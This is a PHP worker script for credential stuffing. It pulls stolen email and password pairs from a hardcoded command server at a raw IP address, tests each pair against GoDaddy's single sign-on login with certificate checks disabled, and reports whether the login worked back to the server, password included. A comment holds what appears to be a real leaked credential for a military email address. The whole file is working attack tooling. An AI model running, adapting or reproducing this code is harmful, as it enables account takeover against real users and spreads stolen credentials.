<?php
	$host = "http://158.69.193.39";
    $connect_url = "/w/api/v1/workers/connect.php";
    $nextmail_url = "/w/api/v1/mails/next.php";
	$newresult_url = "/w/api/v1/results/new.php";
    
    $secret = "\$2y\$12\$J1k/vLIWAW13Kg5KGBxpY.tfuaQN2IVJ5QjS27j/UJSCYu0XERzsW";
    
    function isConnected($url) {
        $connect_init = curl_init($url);
    
        curl_setopt($connect_init, CURLOPT_RETURNTRANSFER, 1);
        $connect_resp = curl_exec($connect_init);
        
        $json_resp = json_decode($connect_resp, true);
        //print_r($json_resp["status"]);
        curl_close($connect_init);
        return $json_resp;
    }
    
    function nextMail($url) {
        $connect_init = curl_init($url);
    
        curl_setopt($connect_init, CURLOPT_RETURNTRANSFER, 1);
        $connect_resp = curl_exec($connect_init);
        
        $json_resp = json_decode($connect_resp, true);
        //print_r($json_resp["status"]);
        curl_close($connect_init);
        return $json_resp;
        // get a mailpass to check "Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) ) ";
    }
    
    function newResult($url, $query) {
        //$secret = $query['secret'];
        //echo $secret."<br>";
        
        $lease_id = $query['id'];
        
        $mail = $query['mail'];
        
        $pass = $query['pass'];
        
        $type = $query['type'];
        
        $result = $query['result'];
        
        $data = $query['data'];
        
		$new_result_url = $url."&id=".$lease_id."&mail=".$mail."&pass=".$pass."&type=".$type."&result=".$result."&data=".$data;
		//echo $new_result_url;
        $new_result_init = curl_init($new_result_url);
        curl_setopt($new_result_init, CURLOPT_POST, 1);
        
        curl_setopt($new_result_init, CURLOPT_RETURNTRANSFER, true);
        
        $new_result_resp = curl_exec($new_result_init);
        
        curl_close($new_result_init);
        
        //print_r($new_result_resp);
    }
    
    function checkGodaddy($mailpass) {
		echo "check godaddy";
        $mail = $mailpass['mail'];
        $pass = $mailpass['pass'];
		//print_r($mailpass);
        
        $get_login_url = "https://sso.godaddy.com/?realm=idp&path=%2F&app=mya";
        $post_login_url = "https://sso.godaddy.com/v1/?path=%2F&app=mya&realm=idp";
        $get_logout_url = "https://sso.godaddy.com/logout?realm=idp&app=mya&path=";
        
        // post login
        $post_login_init = curl_init($post_login_url);
        //curl_setopt($post_login_url, CURLOPT_POST, 1);
		curl_setopt($post_login_init, CURLOPT_HTTPHEADER, array(
					'Upgrade-Insecure-Requests: 1',
					'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
					'Content-Type: application/x-www-form-urlencoded',
					'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
					'Accept-Language: en-US,en;q=0.8'
					));
		curl_setopt($post_login_init, CURLOPT_POSTFIELDS, "app=mya&layout=layout.rebrand_layout.html&name=".$mail."&password=".$pass."&realm=idp&remember_me=on");
		curl_setopt($post_login_init, CURLOPT_VERBOSE, true);
		curl_setopt($post_login_init, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($post_login_init, CURLOPT_SSL_VERIFYPEER, false);
        
        
        $post_login_resp = curl_exec($post_login_init);
        
        if (!curl_errno($post_login_init)) {
			switch ($http_code = curl_getinfo($post_login_init, CURLINFO_HTTP_CODE)) {
				case 200:  # Not login
					echo 'login fault';
					curl_close($post_login_init);
					return 0;
					break;
				case 302: # OK
					echo 'login success';
					
					sleep(5000);
					$get_logout_init = curl_init($get_logout_url);
					curl_setopt($get_logout_init, CURLOPT_VERBOSE, true);
					curl_setopt($get_logout_init, CURLOPT_RETURNTRANSFER, true);
					curl_setopt(get_logout_init, CURLOPT_SSL_VERIFYPEER, false);
					curl_exec($get_logout_init);
					// logout
					curl_close($post_login_init);
					return 1;
					break;
				default:
					echo 'Unexpected HTTP code: ', $http_code, "\n";
			}
		}
        
    }
	
	$is_connected = isConnected($host.$connect_url."?secret=".$secret);
	if ($is_connected) {
		echo $is_connected['desc'];
		// get mailpass
		$nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1");
		// Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) )
		
		if($nextmail_resp['status']) {
			$mailpass = $nextmail_resp['data'];
			$result = checkGodaddy($mailpass);
			$query = array(	'id' => $mailpass['id'],
							'mail' => $mailpass['mail'],
							'pass' => $mailpass['pass'],
							'type' => $mailpass['types'],
							'result' => $result,
							'data' => '');
			
			$new_result_url = $host.$newresult_url."?secret=".$secret;
			newResult($new_result_url, $query);
			echo "update success";
		}
	
	}

?>